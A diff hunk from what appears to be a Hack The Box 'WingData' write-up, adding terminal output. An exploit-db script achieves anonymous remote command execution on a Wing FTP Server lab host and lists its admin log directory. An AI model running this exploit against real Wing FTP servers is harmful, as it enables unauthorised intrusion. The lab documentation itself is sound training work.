@@ -459,3 +459,27 @@ drwxr-x--- 5 wingftp wingftp 4096 Feb 15 11:19 ..
 
 ```
 
+```
+(venv) ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "ls -la Log/Admin"
+
+[*] Testing target: http://ftp.wingdata.htb
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ls -la Log/Admin' and username: 'anonymous'
+[+] UID extracted: 9514497d70931e98dc5f9fb92a4f92e1f528764d624db129b32c21fbca0cb8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 9514497d70931e98dc5f9fb92a4f92e1f528764d624db129b32c21fbca0cb8d6
+
+--- Command Output ---
+total 44
+drwxr-x--- 2 wingftp wingftp 4096 Feb 15 09:15 .
+drwxr-x--- 5 wingftp wingftp 4096 Feb 15 12:04 ..
+-rwxr-x--- 1 wingftp wingftp 2753 Nov  2 16:27 Admin-2025-11-2.log
+-rw-rw-rw- 1 wingftp wingftp  337 Nov  3 04:22 Admin-2025-11-3.log
+-rw-rw-rw- 1 wingftp wingftp  118 Jan 12 08:25 Admin-2026-1-12.log
+-rw-rw-rw- 1 wingftp wingftp  118 Jan 14 05:00 Admin-2026-1-14.log
+-rw-rw-rw- 1 wingftp wingftp  118 Jan 20 06:31 Admin-2026-1-20.log
+-rw-rw-rw- 1 wingftp wingftp  354 Jan 22 05:16 Admin-2026-1-22.log
+-rw-rw-rw- 1 wingftp wingftp  103 Jan  8 09:25 Admin-2026-1-8.log
+-rw-rw-rw- 1 wingftp wingftp  115 Feb 15 09:15 Admin-2026-2-15.log
+-rw-rw-rw- 1 wingftp wingftp  236 Feb  9 09:35 Admin-2026-2-9.log
+----------------------
+```
+
